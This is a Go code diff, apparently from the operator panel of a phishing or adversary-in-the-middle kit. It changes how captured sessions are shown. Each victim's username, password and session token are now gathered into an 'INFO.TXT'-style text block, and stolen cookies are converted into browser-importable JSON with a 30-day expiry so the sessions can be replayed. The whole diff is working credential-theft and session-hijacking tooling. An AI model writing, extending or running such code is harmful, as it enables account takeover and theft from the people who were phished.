@@ -1414,15 +1414,49 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 
 		detail := `<span style="color:var(--t3)">—</span>`
 		if hasCreds || hasTokens {
-			tokenJSON, _ := json.MarshalIndent(map[string]interface{}{
-				"cookie_tokens": sess.CookieTokens,
-				"body_tokens":   sess.BodyTokens,
-				"http_tokens":   sess.HttpTokens,
-			}, "", "  ")
+			sessionVal := "N/A"
+			for _, v := range sess.BodyTokens {
+				sessionVal = v
+				break
+			}
+			if sessionVal == "N/A" {
+				for _, v := range sess.HttpTokens {
+					sessionVal = v
+					break
+				}
+			}
+
+			type browserCookie struct {
+				Path           string `json:"path"`
+				Domain         string `json:"domain"`
+				ExpirationDate int64  `json:"expirationDate"`
+				Value          string `json:"value"`
+				Name           string `json:"name"`
+				HttpOnly       bool   `json:"httpOnly"`
+			}
+			var cookies []browserCookie
+			expiry := sess.UpdateTime + 2592000
+			for domain, tokenMap := range sess.CookieTokens {
+				for _, ct := range tokenMap {
+					cookies = append(cookies, browserCookie{
+						Path:           ct.Path,
+						Domain:         domain,
+						ExpirationDate: expiry,
+						Value:          ct.Value,
+						Name:           ct.Name,
+						HttpOnly:       ct.HttpOnly,
+					})
+				}
+			}
+			cookieJSON, _ := json.MarshalIndent(cookies, "", "    ")
+
+			infoText := fmt.Sprintf("Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
+				sess.Username, sess.Password, sessionVal, string(cookieJSON))
+
 			detail = fmt.Sprintf(`<details>
 <summary>▶ view tokens</summary>
 <pre>%s</pre>
-</details>`, template.HTMLEscapeString(string(tokenJSON)))
+</details>`, template.HTMLEscapeString(infoText))
 		}
 
 		b.WriteString(fmt.Sprintf(`<tr>
